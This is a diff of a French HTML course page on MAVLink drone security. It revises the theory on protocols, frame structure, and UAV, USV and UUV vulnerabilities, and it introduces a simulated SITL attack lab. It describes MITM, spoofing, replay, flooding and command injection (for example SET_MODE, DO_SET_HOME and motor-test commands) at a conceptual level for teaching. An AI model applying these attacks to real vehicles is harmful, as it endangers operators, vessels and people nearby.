-          <li>Longue portée, faible consommation énergétique</li>
-          <li>Idéal pour télémétrie longue distance, agriculture intelligente, surveillance</li>
-          <li>Non adapté au streaming vidéo (faible débit)</li>
-        </ul>
-      </div>
-    </div>
-
-    <h4 class="sub2">2. Protocoles Réseau (IP)</h4>
-    <div class="two-col">
-      <div class="info-box">
-        <div class="ib-title">TCP / UDP / HTTP</div>
-        <ul class="styled">
-          <li><strong>TCP</strong> : transmission fiable avec contrôle d'erreur, latence plus élevée</li>
-          <li><strong>UDP</strong> : rapide, faible latence, idéal pour la télémétrie temps réel et FPV</li>
-          <li><strong>HTTPS</strong> : gestion et serveurs cloud avec chiffrement TLS</li>
-          <li><strong>WebSocket</strong> : communication bidirectionnelle temps réel pour tableaux de bord</li>
-        </ul>
-      </div>
-      <div class="info-box">
-        <div class="ib-title">Protocoles Satellite</div>
-        <ul class="styled">
-          <li><strong>Iridium</strong> : couverture mondiale, zones isolées, débit faible</li>
-          <li><strong>Inmarsat/BGAN</strong> : missions longues, surveillance</li>
-          <li><strong>Starlink (LEO)</strong> : débit élevé, latence faible, très prometteur</li>
-          <li><strong>GPS/GLONASS/Galileo</strong> : navigation par satellite indispensable</li>
-        </ul>
-      </div>
-    </div>
-
-    <h3 class="subsection">Le Protocole MAVLink</h3>
-    <div class="prose">
-      MAVLink (<strong>Micro Air Vehicle Link</strong>) est un protocole de messagerie léger, conçu pour les systèmes embarqués avec peu de ressources et pour les liaisons radio à bande passante limitée. C'est l'un des protocoles les plus importants dans l'écosystème des drones, notamment sur les plateformes <strong>PX4 et ArduPilot</strong>.
-    </div>
-
-    <div class="two-col">
-      <div class="info-box">
-        <div class="ib-title">MAVLink transmet</div>
-        <ul class="styled">
-          <li>Télémétrie : altitude, vitesse, batterie, GPS, attitude</li>
-          <li>Ordres de commande (mode, armement…)</li>
-          <li>Missions (plans de vol, waypoints)</li>
-          <li>Paramètres de configuration</li>
-          <li>Communication avec composants externes (caméra, ordinateur embarqué)</li>
-        </ul>
-      </div>
-      <div class="info-box">
-        <div class="ib-title">Approche hybride</div>
-        <ul class="styled">
-          <li><strong>Diffusion (publish/subscribe)</strong> : flux continus comme la télémétrie</li>
-          <li><strong>Point-à-point</strong> : échanges critiques (missions, paramètres)</li>
-          <li>Deux types de messages : Command&Control (GCS→drone) et Telemetry/Status (drone→GCS)</li>
-        </ul>
-      </div>
-    </div>
-
-    <h4 class="sub2">Structure d'un Message MAVLink</h4>
+    <h4 class="sub2">Structure d'une trame MAVLink</h4>
     <div class="packet-viz">
       <div class="packet-field highlight">
         <div class="fname">STX</div>
-        <div class="fval">0xFE</div>
+        <div class="fval">0xFE / 0xFD</div>
       </div>
-      <div class="packet-field">
-        <div class="fname">LEN</div>
-        <div class="fval">Longueur</div>
-      </div>
-      <div class="packet-field">
-        <div class="fname">SEQ</div>
-        <div class="fval">Séquence</div>
-      </div>
-      <div class="packet-field">
-        <div class="fname">SYS</div>
-        <div class="fval">System ID</div>
-      </div>
-      <div class="packet-field">
-        <div class="fname">COMP</div>
-        <div class="fval">Comp ID</div>
-      </div>
-      <div class="packet-field">
-        <div class="fname">MSG</div>
-        <div class="fval">Message ID</div>
-      </div>
-      <div class="packet-field" style="min-width:140px">
+      <div class="packet-field"><div class="fname">LEN</div><div class="fval">Longueur</div></div>
+      <div class="packet-field"><div class="fname">SEQ</div><div class="fval">Séquence</div></div>
+      <div class="packet-field"><div class="fname">SYS</div><div class="fval">System ID</div></div>
+      <div class="packet-field"><div class="fname">COMP</div><div class="fval">Comp ID</div></div>
+      <div class="packet-field"><div class="fname">MSG</div><div class="fval">Message ID</div></div>
+      <div class="packet-field" style="min-width:150px">
         <div class="fname">PAYLOAD</div>
-        <div class="fval">Données GPS…</div>
+        <div class="fval">Données (GPS, ATTITUDE…)</div>
       </div>
       <div class="packet-field danger">
         <div class="fname">CKA/CKB</div>
         <div class="fval">Checksum</div>
       </div>
     </div>
-    <div class="alert alert-warn">
-      <strong>⚠ Attention</strong>
-      Architecture minimaliste et priorité donnée à la performance au détriment de la sécurité → protocole hautement vulnérable aux attaques réseau. Le CRC contrôle seulement les erreurs de transmission, pas les altérations malveillantes.
-    </div>
+    <p class="prose">
+      <strong>0xFE</strong> = MAVLink v1, <strong>0xFD</strong> = MAVLink v2. Le CRC en fin de trame
+      détecte les erreurs de transmission, mais <em>ne protège pas</em> contre les altérations malveillantes.
+    </p>
 
-    <h4 class="sub2">MAVLink 1 vs MAVLink 2</h4>
+    <h4 class="sub2">MAVLink v1 vs MAVLink v2</h4>
     <div class="compare-grid">
       <div class="compare-cell v1">
-        <div class="c-label">● MAVLink v1 — Legacy</div>
+        <div class="c-label">● MAVLink v1 (legacy)</div>
         <ul>
-          <li>Format de message simple</li>
-          <li>Message sets limités et peu extensibles</li>
-          <li>Aucune sécurité des données</li>
-          <li>Débit de base</li>
-          <li>Identifiant 8-bit (0xFE)</li>
-          <li>Pas de signature de message</li>
-          <li>Commandes limitées</li>
+          <li>Format simple, peu extensible</li>
+          <li>Identifiant de message 8 bits</li>
+          <li>Aucune signature, aucune authentification</li>
+          <li>Toujours en clair sur le réseau</li>
         </ul>
       </div>
       <div class="compare-cell v2">
-        <div class="c-label">● MAVLink v2 — Modern</div>
+        <div class="c-label">● MAVLink v2 (moderne)</div>
         <ul>
-          <li>Format complexe et extensible</li>
-          <li>Message sets vastes et flexibles</li>
-          <li>Signature cryptographique intégrée</li>
-          <li>Débit amélioré, payload compact</li>
-          <li>Identifiant 8-bit (0xFD) + ID 24-bit</li>
-          <li>Authentification de source</li>
-          <li>Support multi-systèmes distribués</li>
+          <li>Format étendu, payload compact</li>
+          <li>Identifiant de message 24 bits</li>
+          <li>Signature cryptographique optionnelle</li>
+          <li>Mais <strong>pas de chiffrement</strong> — les données restent visibles</li>
         </ul>
       </div>
     </div>
 
-    <h3 class="subsection">Vulnérabilités du Protocole MAVLink</h3>
-
-    <div class="vuln-card">
-      <div class="vuln-title">1 — Conception Non Sécurisée</div>
-      <p class="prose">Aucun mécanisme de chiffrement ni d'authentification n'a été intégré lors de la conception initiale pour maximiser la rapidité et éviter la surcharge processeur.</p>
-      <ul class="styled">
-        <li>Messages non chiffrés : GPS, altitude, commandes circulent en clair</li>
-        <li>Absence d'authentification : un message falsifié n'est pas distingué d'un légitime</li>
-        <li>Manque d'intégrité forte : CRC insuffisant face aux altérations malveillantes</li>
-      </ul>
+    <h4 class="sub2">Les messages MAVLink à connaître</h4>
+    <div style="overflow-x:auto; margin: 16px 0;">
+      <table class="data-table">
+        <thead>
+          <tr><th>Message</th><th>Contenu</th><th>Rôle</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><span class="sensor-badge">HEARTBEAT</span></td><td>État système, mode</td><td>Signal « je suis vivant », 1 Hz</td></tr>
+          <tr><td><span class="sensor-badge">GPS_RAW_INT</span></td><td>Lat, lon, alt, satellites</td><td>Données GPS brutes</td></tr>
+          <tr><td><span class="sensor-badge">GLOBAL_POSITION_INT</span></td><td>Position + altitude + vitesse</td><td>Position fusionnée</td></tr>
+          <tr><td><span class="sensor-badge">ATTITUDE</span></td><td>Roll, pitch, yaw</td><td>Orientation, stabilisation</td></tr>
+          <tr><td><span class="sensor-badge">VFR_HUD</span></td><td>Altitude, vitesse, throttle</td><td>Affichage HUD</td></tr>
+          <tr><td><span class="sensor-badge">SYS_STATUS</span></td><td>Batterie, capteurs</td><td>Surveillance système</td></tr>
+          <tr><td><span class="sensor-badge">MISSION_CURRENT</span></td><td>Waypoint en cours</td><td>Suivi de mission</td></tr>
+          <tr><td><span class="sensor-badge">COMMAND_LONG</span></td><td>Commandes (arm, takeoff…)</td><td>Ordres vers le drone</td></tr>
+          <tr><td><span class="sensor-badge">SET_POSITION_TARGET_GLOBAL_INT</span></td><td>Cible de position</td><td>Guidage externe</td></tr>
+        </tbody>
+      </table>
     </div>
 
-    <div class="vuln-card">
-      <div class="vuln-title">2 — Sniffing & Man-in-the-Middle (MITM)</div>
-      <p class="prose">La structure non chiffrée permet une attaque MITM par ARP poisoning, où l'adversaire s'intercale entre le drone et la station sol.</p>
-      <ul class="styled">
-        <li>Sniffing du trafic : position GPS, vitesse, cap des moteurs, statut de mission</li>
-        <li>Altération ou retardement des messages</li>
-        <li>Identification des trames critiques : HEARTBEAT, MISSION_COUNT, GLOBAL_POSITION_INT</li>
-      </ul>
-    </div>
-
-    <div class="vuln-card">
-      <div class="vuln-title">3 — Flooding (Déni de Service)</div>
-      <p class="prose">Envoi massif de paquets ICMP qui saturent la bande passante ou le processeur du drone.</p>
-      <ul class="styled">
-        <li>Perte de communication GCS ↔ UAV</li>
-        <li>Arrêt automatique de la mission (fail-safe hit)</li>
-      </ul>
-    </div>
-
-    <div class="vuln-card">
-      <div class="vuln-title">4 — Injection de Paquets MAVLink</div>
-      <p class="prose">Un attaquant peut réinjecter un faux MISSION_COUNT pendant le vol après avoir intercepté les trames.</p>
-      <ul class="styled">
-        <li>Le drone supprime sa mission en cours → hovering indéfini</li>
-        <li>Injection d'une nouvelle mission factice → détournement du vol</li>
-        <li>Impact critique : arrêt immédiat de la mission sans crash</li>
-      </ul>
-    </div>
-
-    <h3 class="subsection">Limites de MAVLink 2</h3>
+    <!-- VULNÉRABILITÉS -->
+    <h3 class="subsection">Pourquoi MAVLink est vulnérable</h3>
     <div class="alert alert-danger">
-      <strong>Limites Importantes</strong>
-      La signature de MAVLink 2 ne chiffre pas le contenu des messages. Un attaquant peut toujours observer, lire la télémétrie, analyser les ordres transmis et cartographier les échanges. La confidentialité des données n'est pas assurée par la seule signature.
-    </div>
-    <ul class="styled">
-      <li>Pas de chiffrement complet — la signature n'assure que l'authenticité et l'intégrité</li>
-      <li>Si la signature n'est pas activée ou si les clés sont mal protégées, le gain est très limité</li>
-      <li>Un attaquant peut encore analyser la fréquence des messages et collecter des informations sensibles</li>
-    </ul>
-
-    <h3 class="subsection">Tableau des Messages MAVLink</h3>
-    <div style="overflow-x:auto; margin: 20px 0;">
-      <table class="data-table">
-        <thead>
-        
-          <tr>
-            <th>Capteur</th>
-            <th>Message MAVLink</th>
-            <th>Ce que ça donne</th>
-            <th>Utilisation</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr><td>GPS</td><td><span class="sensor-badge">GPS_RAW_INT</span></td><td>Latitude, longitude, vitesse, satellites</td><td>Navigation, position</td></tr>
-          <tr><td>Position globale</td><td><span class="sensor-badge">GLOBAL_POSITION_INT</span></td><td>Position + altitude + vitesse</td><td>Suivi du drone</td></tr>
-          <tr><td>Orientation</td><td><span class="sensor-badge">ATTITUDE</span></td><td>Roll, pitch, yaw</td><td>Stabilisation</td></tr>
-          <tr><td>IMU (brut)</td><td><span class="sensor-badge">RAW_IMU</span></td><td>Accélération + gyro</td><td>Contrôle bas niveau</td></tr>
-          <tr><td>IMU filtrée</td><td><span class="sensor-badge">SCALED_IMU2</span></td><td>Données IMU plus propres</td><td>Algorithmes</td></tr>
-          <tr><td>Altitude baro</td><td><span class="sensor-badge">SCALED_PRESSURE</span></td><td>Pression + altitude estimée</td><td>Altitude</td></tr>
-          <tr><td>Vitesse / HUD</td><td><span class="sensor-badge">VFR_HUD</span></td><td>Altitude, vitesse, throttle</td><td>Monitoring vol</td></tr>
-          <tr><td>Batterie</td><td><span class="sensor-badge">SYS_STATUS</span></td><td>Voltage, courant, batterie %</td><td>Sécurité</td></tr>
-          <tr><td>Heartbeat</td><td><span class="sensor-badge">HEARTBEAT</span></td><td>État système, mode</td><td>Communication</td></tr>
-          <tr><td>Mission</td><td><span class="sensor-badge">MISSION_CURRENT</span></td><td>Waypoint actuel</td><td>Suivi mission</td></tr>
-          <tr><td>Vitesse locale</td><td><span class="sensor-badge">LOCAL_POSITION_NED</span></td><td>Position X,Y,Z locale</td><td>Contrôle avancé</td></tr>
-          <tr><td>Obstacles</td><td><span class="sensor-badge">DISTANCE_SENSOR</span></td><td>Distance obstacles</td><td>Évitement</td></tr>
-          <tr><td>Caméra</td><td><span class="sensor-badge">CAMERA_FEEDBACK</span></td><td>Infos capture image</td><td>Vision</td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- ── PARTIE 2 : USV ── -->
-  <div class="part-banner">
-    <div class="part-num">02</div>
-    <div class="part-info">
-      <div class="part-label">Partie 2</div>
-      <div class="part-name">Drone de Surface — USV (Unmanned Surface Vehicle)</div>
-    </div>
-  </div>
-
-  <div class="content-area">
-
-    <h3 class="subsection">Qu'est-ce qu'un USV ?</h3>
-    <p class="prose">Les USV (Unmanned Surface Vehicles) sont des véhicules de surface sans pilote opérant à la surface des milieux aquatiques (mers, océans, lacs). Ils peuvent être entièrement autonomes ou téléopérés à distance, réduisant les risques humains et permettant des missions prolongées en environnements hostiles.</p>
-
-    <div class="cards-grid"  style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
-      <div class="card">
-        <div class="card-title">Surveillance Maritime</div>
-        <div class="card-body">Contrôle des frontières, lutte contre la piraterie, surveillance des zones économiques exclusives.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Recherche & Sauvetage</div>
-        <div class="card-body">Assistance lors d'accidents en mer, détection de survivants, support aux équipes humaines (SAR).</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Cartographie Océanographique</div>
-        <div class="card-body">Collecte de données bathymétriques, analyse des fonds marins et suivi environnemental.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Applications Militaires</div>
-        <div class="card-body">Reconnaissance, déminage naval, missions de renseignement et opérations de sécurité.</div>
-      </div>
-    </div>
-
-    <h3 class="subsection">Contraintes Physiques du Milieu Maritime</h3>
-    <div class="two-col">
-      <div class="info-box">
-        <div class="ib-title">Atténuation Signal RF</div>
-        <ul class="styled">
-          <li>Humidité et embruns : absorption des signaux RF haute fréquence</li>
-          <li>Conditions atmosphériques variables : réduction de portée de 40 à 70 %</li>
-          <li>Corrosion des antennes par l'environnement salin</li>
-          <li>Effet ducting : zones de propagation anormale</li>
-        </ul>
-      </div>
-      <div class="info-box">
-        <div class="ib-title">Multi-trajets & Infrastructure</div>
-        <ul class="styled">
-          <li>Surface de l'eau : excellent réflecteur d'ondes EM</li>
-          <li>Signaux arrivant par trajets multiples → interférences destructives</li>
-          <li>Dégradation du SNR, augmentation du BER, instabilité du lien MAVLink</li>
-          <li>Au-delà de 20-50 km des côtes : aucun réseau cellulaire disponible</li>
-        </ul>
-      </div>
-    </div>
-
-    <div class="alert alert-warn" style="margin-top:20px">
-      <strong>Environnement Hostile</strong>
-      Conditions météo instables (vents, vagues, tempêtes) · Courants marins imprévisibles · Forte humidité affectant les systèmes électroniques · Connectivité limitée ou intermittente
-    </div>
-
-    <h3 class="subsection">Vulnérabilités MAVLink dans le Contexte USV</h3>
-
-    <div class="vuln-card">
-      <div class="vuln-title">1 — Absence de Chiffrement</div>
-      <p class="prose">Un attaquant équipé d'un récepteur SDR peut intercepter passsivement toutes les données de télémétrie (position, cap, vitesse, état batterie), reconstituer le plan de mission complet et identifier les zones d'intérêt stratégiques.</p>
-      <div class="alert alert-danger" style="margin-top:12px">
-        <strong>Impact aggravé USV</strong>
-        Les missions USV couvrent souvent des zones militaires, des infrastructures critiques (pipelines, câbles sous-marins). La compromission peut avoir des conséquences géopolitiques et sécuritaires majeures.
-      </div>
+      <strong>Le constat</strong>
+      MAVLink n'a pas été conçu pour la sécurité. Par défaut, il est <em>non chiffré</em>, <em>non authentifié</em>,
+      et transporté en <em>UDP ouvert</em>. Quatre types d'attaques deviennent triviales :
     </div>
 
     <div class="vuln-card">
-      <div class="vuln-title">2 — Injection de Commandes & Spoofing</div>
-      <ul class="styled">
-        <li>SET_MODE → basculer en mode MANUAL et faire dériver l'USV</li>
-        <li>MISSION_ITEM frauduleux → dévier vers une zone dangereuse</li>
-        <li>DO_SET_HOME → redéfinir le point de retour base</li>
-        <li>MAV_CMD_DO_MOTOR_TEST → arrêter les moteurs en mer</li>
-      </ul>
-      <p class="prose" style="margin-top:10px">Contrairement à un UAV qui peut atterrir d'urgence, un USV sans moteur en mer devient incontrôlable, sujet aux courants et aux vents, avec risque de collision.</p>
+      <div class="vuln-title">1 — Interception (sniffing)</div>
+      <p class="prose">N'importe qui sur le réseau peut écouter le trafic et lire la télémétrie en clair : position GPS, vitesse, état batterie, plan de mission.</p>
     </div>
 
     <div class="vuln-card">
-      <div class="vuln-title">3 — MITM et Jamming</div>
-      <ul class="styled">
-        <li>MITM : Falsification de la télémétrie, modification des commandes, suppression des alertes</li>
-        <li>Jamming : l'USV entre en fail-safe, peut dériver des heures en haute mer</li>
-        <li>Jamming ciblé lors d'une manœuvre critique (entrée dans un port) → risque de collision</li>
-        <li>Équipements de jamming portables et peu coûteux : vecteur d'attaque accessible</li>
-      </ul>
+      <div class="vuln-title">2 — Spoofing</div>
+      <p class="prose">Un attaquant peut se faire passer pour la GCS et envoyer des commandes, ou pour le GPS et fournir de fausses positions.</p>
     </div>
 
-    <div class="cards-grid">
-      <div class="card">
-        <div class="card-title" style="color:#f08080">Récupération Difficile</div>
-        <div class="card-body">Un USV compromis en haute mer est souvent irrécupérable. L'envoi d'une équipe nécessite un navire, du temps et des conditions favorables.</div>
-      </div>
-      <div class="card">
-        <div class="card-title" style="color:#f08080">Isolement Total</div>
-        <div class="card-body">Aucune intervention humaine directe possible en temps réel. La réponse doit être entièrement automatisée → mécanismes embarqués robustes.</div>
-      </div>
-      <div class="card">
-        <div class="card-title" style="color:#f08080">Dépendance Critique</div>
-        <div class="card-body">Un USV sans lien de communication peut devenir un danger actif pour la navigation maritime et engager la responsabilité légale de l'opérateur.</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ── PARTIE 3 : UUV ── -->
-  <div class="part-banner">
-    <div class="part-num">03</div>
-    <div class="part-info">
-      <div class="part-label">Partie 3</div>
-      <div class="part-name">Véhicule Sous-Marin — UUV (Unmanned Underwater Vehicle)</div>
-    </div>
-  </div>
-
-  <div class="content-area">
-
-    <h3 class="subsection">Définition & Types</h3>
-    <p class="prose">Les UUV constituent la catégorie de véhicules autonomes la plus complexe sur le plan des communications. Contrairement aux UAV et USV bénéficiant de liaisons radio directes, les UUV opèrent dans un milieu où les ondes électromagnétiques sont quasi-inexistantes au-delà de quelques mètres. Ils ne peuvent pas utiliser MAVLink directement sur un lien radio en temps réel lorsqu'ils sont immergés.</p>
-
-    <div style="overflow-x:auto; margin:20px 0">
-      <table class="data-table">
-        <thead>
-          <tr><th>Type</th><th>Acronyme</th><th>Mode</th><th>Caractéristiques</th></tr>
-        </thead>
-        <tbody>
-          <tr><td>Autonomous Underwater Vehicle</td><td><span class="sensor-badge">AUV</span></td><td>Autonome</td><td>Mission pré-programmée, pas de lien temps réel, retour base pour récupération des données</td></tr>
-          <tr><td>Remotely Operated Vehicle</td><td><span class="sensor-badge">ROV</span></td><td>Téléopéré</td><td>Cordon ombilical filaire (tether), contrôle temps réel, inspection offshore</td></tr>
-          <tr><td>Hybrid AUV/ROV</td><td><span class="sensor-badge">HAUV</span></td><td>Hybride</td><td>Peut opérer en mode AUV ou commuter en mode ROV selon la mission</td></tr>
-          <tr><td>Micro/Nano AUV</td><td><span class="sensor-badge">MAUV</span></td><td>Autonome léger</td><td>Petite taille, mission courte, essaim, inspection d'infrastructures sous-marines</td></tr>
-        </tbody>
-      </table>
+    <div class="vuln-card">
+      <div class="vuln-title">3 — Injection de commandes</div>
+      <p class="prose">ARM/DISARM, SET_MODE, NAV_TAKEOFF — un paquet bien formé suffit pour prendre la main sur le véhicule.</p>
     </div>
 
-    <h3 class="subsection">Technologies de Communication Sous-Marines</h3>
-    <div class="cards-grid">
-      <div class="card">
-        <div class="card-title">Communication Acoustique</div>
-        <div class="card-body">La plus utilisée. Portée plusieurs km. Débit faible, latence élevée (vitesse du son ≈ 1500 m/s). Sensible au bruit ambiant, température, salinité et multi-trajets.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Communication Optique</div>
-        <div class="card-body">Spectre bleu-vert. Très haut débit (Mbps), faible latence, portée limitée (quelques dizaines de mètres). Nécessite ligne de vue directe. Sensible à la turbidité.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Communication RF</div>
-        <div class="card-body">Très limité sous l'eau (quelques cm à quelques mètres). Utilisé uniquement en surface ou très faible profondeur. Haut débit mais forte atténuation dans l'eau salée.</div>
-      </div>
+    <div class="vuln-card">
+      <div class="vuln-title">4 — Replay attack</div>
+      <p class="prose">On capture des messages légitimes et on les rejoue plus tard pour reproduire une action (changement de mode, mission, etc.).</p>
     </div>
 
-    <h3 class="subsection">Protocoles de Communication UUV</h3>
-    <div class="two-col">
-      <div class="info-box">
-        <div class="ib-title">Protocoles Internes</div>
-        <ul class="styled">
-          <li><strong>UART</strong> : simple et léger, capteurs ↔ processeur</li>
-          <li><strong>I2C</strong> : communication courte distance, capteurs multiples</li>
-          <li><strong>SPI</strong> : rapide, capteurs haut débit</li>
-          <li><strong>CAN</strong> : robuste, tolérant aux erreurs, systèmes critiques</li>
-        </ul>
-      </div>
-      <div class="info-box">
-        <div class="ib-title">Protocoles Acoustiques</div>
-        <ul class="styled">
-          <li><strong>JANUS</strong> : standard OTAN pour communication sous-marine, interopérabilité</li>
-          <li><strong>WHOI Micro-Modem</strong> : utilisé dans les modems acoustiques, adapté aux faibles débits</li>
-          <li><strong>ROS</strong> : architecture logicielle robotique, facilite la communication inter-modules</li>
-          <li><strong>DDS</strong> : communication temps réel, systèmes distribués</li>
-        </ul>
-      </div>
+
+    <!-- CTA -->
+    <div class="alert alert-info" style="margin-top:36px">
+      <strong>La suite : la pratique</strong>
+      Place aux manipulations. On installe ArduPilot SITL, on capture du trafic MAVLink, et on exécute
+      trois scénarios d'attaque : GPS spoofing, déni de service, et man-in-the-middle.
     </div>
-
-    <h3 class="subsection">Utilisation de MAVLink dans les UUV</h3>
-    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
-      <div class="card">
-        <div class="card-title">ROV (tether)</div>
-        <div class="card-body">MAVLink utilisé en temps réel grâce au câble. Envoi de commandes joystick, réception position/orientation. Risque : accès physique au câble → interception ou injection MITM.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">AUV — Avant Mission</div>
-        <div class="card-body">Définir waypoints, régler paramètres, vérifier capteurs. Une fois lancé, le robot suit le plan seul. Risque : modification pré-départ → trajectoire erronée non détectable.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">AUV — Après Mission</div>
-        <div class="card-body">Téléchargement des logs, analyse de trajectoire, détection d'anomalies. Risque : données sensibles (zones explorées, informations collectées).</div>
-      </div>
-      <div class="card">
-        <div class="card-title">MAVLink Acoustique</div>
-        <div class="card-body">Adapté pour envoyer des informations importantes (position, état). Débit très faible, délai important. Risque : données fragmentées → erreurs ou attaques, difficile à sécuriser.</div>
-      </div>
-    </div>
-
-    <h3 class="subsection">Vulnérabilités des UUV (Unmanned Underwater Vehicles)</h3>
-
-  <div class="vuln-card">
-    <div class="vuln-title">1 — Injection MAVLink en phase pré-mission</div>
-    <p class="prose">
-      Avant le déploiement, un attaquant ayant accès au réseau (Wi-Fi, Ethernet) peut injecter des commandes malveillantes.
-      Une fois immergé, l’UUV ne peut plus être reconfiguré.
-    </p>
-    <ul class="styled">
-      <li>Modification des waypoints → redirection vers zone interdite</li>
-      <li>Ajout de DO_JUMP → boucle infinie → épuisement batterie</li>
-      <li>Modification de WPNAV_SPEED → consommation excessive</li>
-      <li>Falsification du point de retour (DO_SET_HOME)</li>
-      <li>Désactivation du géofencing</li>
-    </ul>
-  </div>
-
-  <div class="vuln-card">
-    <div class="vuln-title">2 — Exfiltration de données (MAVFTP)</div>
-    <p class="prose">
-      Le protocole MAVFTP permet le transfert de fichiers sans authentification forte.
-    </p>
-    <ul class="styled">
-      <li>Trajectoires GPS précises</li>
-      <li>Données sonar et images</li>
-      <li>Données CTD (température, salinité, pression)</li>
-      <li>Logs capteurs → capacités techniques</li>
-      <li>Paramètres système et réseau</li>
-    </ul>
-  </div>
-
-  <div class="vuln-card">
-    <div class="vuln-title">3 — Compromission du firmware</div>
-    <p class="prose">
-      L’absence de signature cryptographique permet l’installation d’un firmware malveillant.
-    </p>
-    <ul class="styled">
-      <li>Espionnage des données capteurs</li>
-      <li>Déclenchement d’actions à distance</li>
-      <li>Désactivation des protections de sécurité</li>
-      <li>Backdoor de contrôle</li>
-    </ul>
-  </div>
-
-  <h3 class="subsection">Vulnérabilités des Communications Acoustiques</h3>
-
-  <div class="vuln-card">
-    <div class="vuln-title">4 — Acoustic Spoofing (USBL/LBL)</div>
-    <p class="prose">
-      Un attaquant peut émettre de faux signaux acoustiques et falsifier les temps de propagation,
-      induisant une erreur de position de l’UUV.
-    </p>
-  </div>
-
-  <div class="vuln-card">
-    <div class="vuln-title">5 — DVL Spoofing (Falsification de Vitesse)</div>
-    <p class="prose">
-      Simulation d’un faux fond marin pour injecter une vitesse erronée →
-      dérive cumulative de la navigation inertielle.
-    </p>
-  </div>
-
-  <div class="vuln-card">
-    <div class="vuln-title">6 — Acoustic Denial of Service (ADoS)</div>
-    <ul class="styled">
-      <li>Brouillage acoustique haute puissance</li>
-      <li>Interférence avec le DVL</li>
-      <li>Ping flooding → saturation du canal</li>
-      <li>Désorganisation d’un essaim d’UUV</li>
-    </ul>
-  </div>
-
-  <div class="vuln-card">
-    <div class="vuln-title">7 — Replay Attack Acoustique</div>
-    <p class="prose">
-      Sans mécanisme anti-rejeu, un attaquant peut enregistrer et rejouer des commandes critiques
-      (remontée, arrêt moteur, mission).
-    </p>
-  </div>
-
-  <h3 class="subsection">Vulnérabilités du Tether (ROV)</h3>
-
-  <div class="vuln-card">
-    <div class="vuln-title">8 — Accès physique au tether</div>
-    <ul class="styled">
-      <li>Interception du trafic (MAVLink, vidéo)</li>
-      <li>Injection de commandes</li>
-      <li>Coupure du lien ROV-surface</li>
-    </ul>
-  </div>
-
-  <div class="vuln-card">
-    <div class="vuln-title">9 — Attaque MITM sur le réseau</div>
-    <ul class="styled">
-      <li>ARP spoofing sur le réseau Ethernet</li>
-      <li>Modification des commandes joystick</li>
-      <li>Falsification des données de télémétrie</li>
-      <li>Injection de commandes ARM/DISARM</li>
-    </ul>
-  </div>
 </div>
+  </div>
 </div><!-- end théorie -->
 
 <!-- ═══════════════════════════════════════════════════════════
-     PARTIE SIMULATION
+     PARTIE 2 — MISE EN PLACE (SIMULATION SITL)
 ═══════════════════════════════════════════════════════════ -->
 <div id="simulation" class="section">
 
   <div class="section-header">
-    <div class="section-eyebrow">Partie Pratique</div>
-    <h2 class="section-title">Simulation & Analyse du Système UAV</h2>
+    <div class="section-eyebrow">Partie 02 — Pratique</div>
+    <h2 class="section-title">Mise en place de l'environnement</h2>
+    <p class="section-intro">
+      On installe et on connecte les outils : le simulateur SITL d'ArduPilot, la station de
+      contrôle QGroundControl, Wireshark pour capturer le trafic, et MAVProxy pour interagir
+      avec le drone en ligne de commande.
+    </p>
   </div>
 
-  <div class="content-area" style="padding-top:0">
+  <div class="content-area">
 
     <div class="alert alert-warn">
-      <strong>⚠ Prérequis Système</strong>
-      Version Ubuntu recommandée : <strong>Ubuntu 22.04 LTS</strong> · ArduPilot récent nécessite <strong>Python ≥ 3.9</strong>
+      <strong>Prérequis</strong>
+      Ubuntu 22.04 LTS recommandé · Python ≥ 3.9 pour les versions récentes d'ArduPilot
     </div>
 
-    <h3 class="subsection">Architecture du Système Simulé</h3>
-    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
-      <div class="card">
-        <div class="card-title">1 — SITL</div>
-        <div class="card-body">Software In The Loop : simule le comportement complet du drone sur ordinateur. Simulation du vol, des capteurs, et exécution du firmware réel.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">2 — GCS (2 stations)</div>
-        <div class="card-body">Station de contrôle au sol : surveille l'état, visualise la trajectoire, envoie des commandes via MAVLink.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">3 — Télémétrie</div>
-        <div class="card-body">Échange de données GPS, vitesse, altitude, état système via le protocole MAVLink (UDP port 14550).</div>
-      </div>
-      <div class="card">
-        <div class="card-title">4 — Capteurs Simulés</div>
-        <div class="card-body">GPS → position · IMU → orientation (ATTITUDE) · Capteurs vitesse et altitude.</div>
-      </div>
+    <!-- Navigation rapide -->
+    <h3 class="subsection">Plan de la mise en place</h3>
+    <div class="step-nav">
+      <a class="step-nav-item" href="#step-sitl">
+        <div class="sn-num">01</div>
+        <div class="sn-label">Étape</div>
+        <div class="sn-name">ArduPilot SITL</div>
+      </a>
+      <a class="step-nav-item" href="#step-qgc">
+        <div class="sn-num">02</div>
+        <div class="sn-label">Étape</div>
+        <div class="sn-name">QGroundControl</div>
+      </a>
+      <a class="step-nav-item" href="#step-windows">
+        <div class="sn-num">03</div>
+        <div class="sn-label">Étape</div>
+        <div class="sn-name">Configuration sous Windows</div>
+      </a>
+      <a class="step-nav-item" href="#step-wireshark">
+        <div class="sn-num">04</div>
+        <div class="sn-label">Étape</div>
+        <div class="sn-name">Wireshark + dissector</div>
+      </a>
+      <a class="step-nav-item" href="#step-mavproxy">
+        <div class="sn-num">05</div>
+        <div class="sn-label">Étape</div>
+        <div class="sn-name">MAVProxy &amp; messages</div>
+      </a>
+      <a class="step-nav-item" href="#step-mission">
+        <div class="sn-num">06</div>
+        <div class="sn-label">Étape</div>
+        <div class="sn-name">Définir une mission</div>
+      </a>
+
     </div>
 
     <!-- ÉTAPE 1 : ArduPilot -->
-    <h3 class="subsection" style="margin-top:48px">Étape 1 — Installation d'ArduPilot SITL</h3>
+    <h3 class="subsection" id="step-sitl">Étape 1 — Installer ArduPilot SITL</h3>
+    <p class="prose">
